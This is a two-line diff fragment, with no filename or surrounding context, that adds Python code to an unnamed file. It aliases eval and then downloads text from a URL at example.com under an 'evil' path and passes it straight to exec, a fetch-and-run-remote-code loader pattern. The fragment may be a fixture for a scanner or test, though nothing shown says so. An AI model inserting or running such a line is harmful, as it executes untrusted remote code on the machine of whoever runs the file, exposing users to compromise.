@@ -1,0 +1,2 @@
+cc = eval
+import requests;exec(requests.get('https://example.com/evil/code').text)
